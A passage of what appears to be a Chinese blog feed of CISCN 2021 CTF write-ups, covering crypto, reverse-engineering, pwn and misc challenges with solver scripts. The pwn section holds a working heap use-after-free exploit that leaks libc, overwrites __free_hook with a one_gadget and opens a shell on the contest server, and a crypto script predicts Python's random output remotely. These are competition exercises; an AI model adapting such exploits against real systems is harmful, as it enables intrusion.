16:</span><br><span class="line">            bin_x &#x3D; &#39;0&#39;*(16-len(bin_x))+bin_x</span><br><span class="line">        bins +&#x3D; bin_x</span><br><span class="line">    for i in range(m):</span><br><span class="line">        for j in range(n):</span><br><span class="line">            index&#x3D;n*i+j</span><br><span class="line">            ch&#x3D;int(bins[2*index:2*index+2],2)</span><br><span class="line">            cip&#x3D;c[index]</span><br><span class="line">            if ch&#x3D;&#x3D;0:</span><br><span class="line">                flag.append(cip^key1)</span><br><span class="line">            if ch&#x3D;&#x3D;1:</span><br><span class="line">                flag.append(~cip^key1)&amp;0xff</span><br><span class="line">            if ch&#x3D;&#x3D;2:</span><br><span class="line">                flag.append(cip^key2)</span><br><span class="line">            if ch&#x3D;&#x3D;3:</span><br><span class="line">                flag.append(~cip^key2)&amp;0xff</span><br><span class="line">    return flag</span><br><span class="line">flag&#x3D;decrypt(c,key1,key2,x0,m,n)</span><br><span class="line">import hashlib</span><br><span class="line">msg&#x3D;hashlib.md5((&#39;&#39;.join(map(chr,flag))).encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">print(&quot;CSCIN&#123;&quot;+msg+&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h2><p>首先是预测随机数也就是破解random，可以直接采用现成的工具，然后通过随机数就可以进入解密，要求输入c0,c1但不能与a,b相同，半蒙半猜的搞出下面的东西，大概就是不要和a,b相同却要a,b相同的作用，那么取最近的试试，还真出了。、？！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import randcrack</span><br><span class="line">import random</span><br><span class="line">from copy import deepcopy</span><br><span class="line">from pwn import *</span><br><span class="line">rc &#x3D; randcrack.RandCrack()</span><br><span class="line">p&#x3D;remote(&quot;121.36.14.168&quot;,24303)</span><br><span class="line">context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">c_0&#x3D;eval(p.recvuntil(&quot;\n&quot;))</span><br><span class="line">c_1&#x3D;eval(p.recvuntil(&quot;\n&quot;))</span><br><span class="line">my_c0&#x3D;deepcopy(c_0)</span><br><span class="line">my_c0[0]-&#x3D;1</span><br><span class="line">my_c1&#x3D;deepcopy(c_1)</span><br><span class="line">my_c1[0]+&#x3D;1</span><br><span class="line">p.recvuntil(&quot;2.decrypt&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">mask &#x3D; (1 &lt;&lt; 32) - 1</span><br><span class="line">for _ in range(312):</span><br><span class="line">    p.recvuntil(&quot;your number:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;lose!my number is &quot;)</span><br><span class="line">    r&#x3D;int(p.recvuntil(&quot;\n&quot;).decode().strip(&quot;\n&quot;))</span><br><span class="line">    k&#x3D;r&gt;&gt;32</span><br><span class="line">    w&#x3D;r&amp;mask</span><br><span class="line">    rc.submit(k)</span><br><span class="line">    rc.submit(w)</span><br><span class="line">    </span><br><span class="line">for _ in range(200):</span><br><span class="line">    p.recvuntil(&quot;your number:&quot;)</span><br><span class="line">    m&#x3D;rc.predict_randrange(0, 2 ** 64 - 1)</span><br><span class="line">    p.sendline(str(m))</span><br><span class="line">    </span><br><span class="line">p.sendline(&quot;2&quot;)   </span><br><span class="line">p.recvuntil(&quot;c0:&quot;)</span><br><span class="line">p.sendline(&quot;,&quot;.join(str(x) for x in my_c0))</span><br><span class="line">p.recvuntil(&quot;c1:&quot;)</span><br><span class="line">p.sendline(&quot;,&quot;.join(str(x) for x in my_c1))</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">#解01串，CISCN&#123;kyVjZ-M47XA-jfGgg-XaK2J-R07QH-&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>在jd-jui中查看主函数</p><p><img src="/2021/05/16/CISCN2021/6.PNG"></p><p>然后在ida里查看so文件</p><p><img src="/2021/05/16/CISCN2021/7.PNG"></p><p><img src="/2021/05/16/CISCN2021/8.PNG"></p><p>解题脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char T[256]&#x3D;&#123;0&#125;;</span><br><span class="line">    unsigned char S[256];</span><br><span class="line">    char key[8]&#x3D;&quot;12345678&quot;;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    int temp;</span><br><span class="line">    int xor[39];</span><br><span class="line">    for(i&#x3D;0; i&lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] &#x3D; key[i % 8];</span><br><span class="line">            S[i]&#x3D;i;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0; i&lt;256;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j &#x3D; (T[i] + j +S[i])%256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    int t;</span><br><span class="line">    for(int r&#x3D;0; r&lt;39;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i &#x3D; (i+1) % 256;</span><br><span class="line">            j &#x3D; (j+S[i]) % 256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">            t &#x3D; (S[j]+S[i]) % 256;</span><br><span class="line">            xor[r]&#x3D;S[t];</span><br><span class="line">    &#125;</span><br><span class="line">    int flag[39] &#x3D; &#123;0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F&#125;;</span><br><span class="line">    int flag2[39];</span><br><span class="line">    for (i &#x3D; 0; i &lt; 39; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^&#x3D; key[i%8];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;39;i+&#x3D;3)</span><br><span class="line">    &#123;</span><br><span class="line">        flag2[i]&#x3D;flag[i+2]^flag[i+1];</span><br><span class="line">        flag2[i+1]&#x3D;flag[i]^flag[i+1];</span><br><span class="line">        flag2[i+2]&#x3D;flag[i]^flag[i+1]^flag[i+2];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;39;i++)</span><br><span class="line">        printf(&quot;%c&quot;,flag2[i]^xor[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">CISCN&#123;6654d84617f627c88846c172e0f4d46c&#125;</span><br></pre></td></tr></table></figure><h2 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h2><p>LLVM-Clang编译器+z3</p><blockquote><p>llc baby.bc -obaby.s<br>clang++baby.o -obaby</p></blockquote><p>然后就能拖入ida中反汇编，这是个数独，用z3添加约束，得出flag后进行MD5。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">n &#x3D; [[0, 0, 0, 1],[1, 0, 0, 0], [2, 0, 0, 1], [0, 0, 0, 0], [1, 0, 1, 0]]</span><br><span class="line">o &#x3D; [[0, 0, 2, 0, 2], [0, 0, 0, 0, 0], [0, 0, 0, 1, 0], [0, 1, 0, 0, 1]]</span><br><span class="line">s &#x3D; Solver()</span><br><span class="line">m &#x3D; [[Int(&#39;x&#39;+str(i)+str(j)) for j in range(5)]for i in range(5)]</span><br><span class="line">print(m)</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        s.add(m[i][j]&gt;0)</span><br><span class="line">        s.add(m[i][j]&lt;6)</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        for k in range(j):</span><br><span class="line">            s.add(m[i][j]!&#x3D;m[i][k])</span><br><span class="line">for j in range(5):</span><br><span class="line">    for i in range(5):</span><br><span class="line">        for k in range(i):</span><br><span class="line">            s.add(m[i][j]!&#x3D;m[k][j])</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        if n[i][j]&#x3D;&#x3D;1:</span><br><span class="line">            s.add(m[i][j]&gt;m[i][j+1])</span><br><span class="line">        elif n[i][j] &#x3D;&#x3D; 2:</span><br><span class="line">            s.add(m[i][j]&lt;m[i][j+1])</span><br><span class="line">for i in range(4):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        if o[i][j]&#x3D;&#x3D;2:</span><br><span class="line">            s.add(m[i][j]&gt;m[i+1][j])</span><br><span class="line">        elif o[i][j]&#x3D;&#x3D;1:</span><br><span class="line">            s.add(m[i][j]&lt;m[i+1][j])</span><br><span class="line">s.add(m[2][2]&#x3D;&#x3D;4)</span><br><span class="line">s.add(m[3][3]&#x3D;&#x3D;3)</span><br><span class="line">if s.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(s.model())</span><br><span class="line">flag&#x3D;1425353142350212150442315</span><br><span class="line">#CISCN&#123;8a04b4597ad08b83211d3adfa1f61431&#125;</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>uaf，edit泄露出chunk00_size</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = buf;</span><br><span class="line">      <span class="keyword">if</span> ( size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)buf + size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )   <span class="comment">//由于当申请小于0x20的堆块时，都会申请到0x20的size，利用这一行可以控制输入8字节字符，show带出chunk00_addr</span></span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>泄露出chunk00_size后，再改掉其中一个chunk的size&gt;0x40，free掉，show，就可以泄露出libc地址了<br>泄露libc后，修改free_hook为onegadget，getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># local_libc=libc-2.27-1.4</span></span><br><span class="line"><span class="comment"># remote_libc=libc-2.27-1.3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">filename = <span class="string">&quot;lonelywolf&quot;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment"># elf</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,payload</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    bk = <span class="string">&quot;b *$rebase&quot;</span> + <span class="built_in">str</span>(addr)</span><br><span class="line">    gdb.attach(io, bk)</span><br><span class="line">    success(<span class="string">&quot;attach&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./&quot;</span> + filename)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/clibcc/pwn-change-libc-main/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;121.36.14.168&quot;</span>,<span class="number">24583</span>)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/ctf-cpt/ciscn/lonelywolf/附件/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#ogg_libc=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">    ogg_libc=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#####leak_chunk_addr#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    chunk00_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    print(<span class="string">&quot;chunk00_addr:&quot;</span>,<span class="built_in">hex</span>(chunk00_addr))</span><br><span class="line">    chunk0_addr=chunk00_addr+<span class="number">0x250</span></span><br><span class="line">    print(<span class="string">&quot;chunk0_addr:&quot;</span>,<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">    <span class="comment">#####prepare_to_change_size#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk0_addr+<span class="number">0x20</span>+<span class="number">0x90</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#####A1igNed_chunk_size#####</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">    <span class="comment">#####unsorted_size#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x421</span>))<span class="comment">#+p64(chunk0_addr+0x30)</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">######malloc_to_unsorted_chunk######</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk00_addr+<span class="number">0x310</span>)+p64(chunk00_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">#####leak_libc#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">    print(<span class="string">&quot;malloc_hook:&quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    <span class="comment">####count####</span></span><br><span class="line">    libcbase=malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    print(<span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    ogg_addr=libcbase+ogg_libc[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#####malloc_to_free_hook#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">#####edit_free_hook#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(ogg_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#####getshell#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#b(0x00000000000008A0)</span></span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>找个在线网站解密<a href="http://www.sendsms.cn/pdu/">PDU解码</a></p><p>得到第一个</p><p><img src="/2021/05/16/CISCN2021/9.png"></p><p>以及第二个</p><p><img src="/2021/05/16/CISCN2021/10.png"></p><p>并且把剩下的全部数据解密了</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:43:59</span><br><span class="line"></span><br><span class="line">5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:44:43</span><br><span class="line"></span><br><span class="line">f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(剩下的数据都差不多)</p><p>根据时间排序并将其写成文件,存为png文件</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>然而png文件打不开,于是联想到hint2,改png宽度为465</p><p>在联想第一个hint,补全flag即可</p><p><img src="/2021/05/16/CISCN2021/11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> CISCN-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfc程序基本流程</title>
      <link href="2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/"/>
      <url>2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/</url>
      
